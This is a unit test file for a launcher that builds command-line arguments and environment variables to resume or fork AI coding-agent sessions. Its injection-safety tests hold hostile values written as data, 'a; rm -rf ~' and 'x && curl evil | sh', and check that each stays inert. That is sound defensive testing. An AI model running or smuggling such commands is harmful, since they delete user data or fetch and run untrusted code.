// src/vault/LaunchBuilder.test.ts — Unit tests for launch argv/env synthesis.

import { describe, expect, it } from "vitest";
import { build, VaultLaunchError } from "./LaunchBuilder";
import type { VaultSessionEntry } from "./types";

function entry(overrides: Partial<VaultSessionEntry> = {}): VaultSessionEntry {
  return {
    id: "claude:sess-1",
    agent: "claude",
    sessionId: "sess-1",
    title: "t",
    cwd: "/Users/me/proj",
    modified: 1,
    flags: {},
    canFork: true,
    ...overrides,
  };
}

describe("build: claude", () => {
  it("resume argv injects model + permission-mode when present", () => {
    const spec = build(entry({ flags: { model: "claude-opus-4-7", permissionMode: "acceptEdits" } }), "resume", {});
    expect(spec.file).toBe("claude");
    expect(spec.args).toEqual(["--resume", "sess-1", "--model", "claude-opus-4-7", "--permission-mode", "acceptEdits"]);
    expect(spec.cwd).toBe("/Users/me/proj");
  });

  it("omits flags whose captured value is absent", () => {
    const spec = build(entry({ flags: {} }), "resume", {});
    expect(spec.args).toEqual(["--resume", "sess-1"]);
  });

  it("forwards only the allowlisted host env vars that are present", () => {
    const spec = build(entry(), "resume", {
      ANTHROPIC_API_KEY: "sk-123",
      ANTHROPIC_BASE_URL: "https://api",
      UNRELATED: "nope",
    });
    expect(spec.env).toEqual({ ANTHROPIC_API_KEY: "sk-123", ANTHROPIC_BASE_URL: "https://api" });
    expect(spec.env).not.toHaveProperty("UNRELATED");
  });

  it("a captured configDir overrides the host CLAUDE_CONFIG_DIR", () => {
    const spec = build(entry({ flags: { configDir: "/captured/config" } }), "resume", {
      CLAUDE_CONFIG_DIR: "/host/config",
    });
    expect(spec.env.CLAUDE_CONFIG_DIR).toBe("/captured/config");
  });

  it("fork uses --fork-session", () => {
    const spec = build(entry(), "fork", {});
    expect(spec.args).toEqual(["--resume", "sess-1", "--fork-session"]);
  });
});

describe("build: codex", () => {
  function codexEntry(flags: VaultSessionEntry["flags"]): VaultSessionEntry {
    return entry({ id: "codex:t1", agent: "codex", sessionId: "t1", cwd: "/c", flags });
  }

  it("preserves -m -a -s flag order and templates reasoning effort", () => {
    const spec = build(
      codexEntry({ model: "gpt-5-codex", approval: "on-request", sandbox: "workspace-write", reasoningEffort: "high" }),
      "resume",
      {},
    );
    expect(spec.args).toEqual([
      "resume",
      "t1",
      "-m",
      "gpt-5-codex",
      "-a",
      "on-request",
      "-s",
      "workspace-write",
      "-c",
      "model_reasoning_effort=high",
    ]);
  });

  it("non-claude agents get an empty env override", () => {
    const spec = build(codexEntry({}), "resume", { ANTHROPIC_API_KEY: "sk" });
    expect(spec.env).toEqual({});
  });

  it("codex fork argv", () => {
    const spec = build(codexEntry({}), "fork", {});
    expect(spec.args).toEqual(["fork", "t1"]);
  });
});

describe("build: injection safety (D9)", () => {
  it("a hostile session id stays a single inert argument", () => {
    const spec = build(entry({ sessionId: "a; rm -rf ~", id: "claude:a; rm -rf ~" }), "resume", {});
    // The dangerous string is exactly one argv element — no shell ever sees it.
    expect(spec.args).toContain("a; rm -rf ~");
    expect(spec.args.filter((a) => a.includes("rm -rf"))).toHaveLength(1);
  });

  it("a hostile flag value stays a single inert argument", () => {
    const spec = build(entry({ flags: { model: "x && curl evil | sh" } }), "resume", {});
    const idx = spec.args.indexOf("--model");
    expect(spec.args[idx + 1]).toBe("x && curl evil | sh");
  });
});

describe("build: errors", () => {
  it("throws no-fork-command when forking an agent without a fork template", () => {
    // Construct a fake agent id with no registry record → unknown-agent path
    expect(() => build(entry({ agent: "ghost" }), "resume", {})).toThrow(VaultLaunchError);
    try {
      build(entry({ agent: "ghost" }), "resume", {});
    } catch (e) {
      expect((e as VaultLaunchError).code).toBe("unknown-agent");
    }
  });
});
